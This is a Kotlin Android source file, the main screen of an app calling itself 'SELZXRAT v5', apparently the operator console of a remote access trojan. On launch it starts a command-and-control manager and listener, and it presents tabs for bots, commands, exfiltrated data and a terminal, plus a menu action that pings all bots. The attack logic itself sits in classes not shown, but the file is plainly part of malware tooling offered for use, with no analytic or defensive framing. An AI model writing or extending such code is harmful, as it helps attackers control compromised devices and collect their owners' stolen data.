package com.selzxrat.v5.ui

import android.content.Intent
import android.os.Bundle
import android.view.Menu
import android.view.MenuItem
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.Toolbar
import androidx.viewpager2.widget.ViewPager2
import com.google.android.material.tabs.TabLayout
import com.google.android.material.tabs.TabLayoutMediator
import com.selzxrat.v5.C2Manager
import com.selzxrat.v5.R
import com.selzxrat.v5.adapters.MainPagerAdapter
import androidx.appcompat.app.AlertDialog

class MainActivity : AppCompatActivity() {

    private lateinit var viewPager: ViewPager2
    private lateinit var tabLayout: TabLayout
    private lateinit var toolbar: Toolbar

    private val tabTitles = arrayOf("Dashboard", "Bots", "Commands", "Exfiltrated", "Terminal")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // --- FIX CRASH: Initialize Manager sebelum UI dimuat ---
        C2Manager.initialize()
        C2Manager.startListening()
        // --------------------------------------------------------

        setContentView(R.layout.activity_main)

        // Setup UI
        toolbar = findViewById(R.id.toolbar)
        setSupportActionBar(toolbar)
        supportActionBar?.title = "SELZXRAT v5"

        viewPager = findViewById(R.id.viewPager)
        tabLayout = findViewById(R.id.tabLayout)

        // Setup Adapter
        val adapter = MainPagerAdapter(this)
        viewPager.adapter = adapter

        // Setup Tabs
        TabLayoutMediator(tabLayout, viewPager) { tab, position ->
            tab.text = tabTitles[position]
            tab.setIcon(getTabIcon(position))
        }.attach()

        // Handle alert intent if exists
        intent?.getStringExtra("show_alert")?.let { message ->
            AlertDialog.Builder(this)
                .setTitle("SELZXRAT Alert")
                .setMessage(message)
                .setPositiveButton("OK", null)
                .setIcon(R.drawable.ic_warning)
                .show()
        }
    }

    private fun getTabIcon(position: Int): Int {
        return when (position) {
            0 -> R.drawable.ic_dashboard
            1 -> R.drawable.ic_bots
            2 -> R.drawable.ic_command
            3 -> R.drawable.ic_exfil
            4 -> R.drawable.ic_terminal
            else -> R.drawable.ic_dashboard
        }
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.main_menu, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_settings -> {
                startActivity(Intent(this, SettingsActivity::class.java))
                true
            }
            R.id.action_about -> {
                startActivity(Intent(this, AboutActivity::class.java))
                true
            }
            R.id.action_refresh -> {
                C2Manager.sendCommand("all", "ping", "")
                Toast.makeText(this, "Ping sent to all bots", Toast.LENGTH_SHORT).show()
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Bersihkan listener saat aplikasi ditutup agar tidak bocor memori
        C2Manager.stopListening()
    }
}
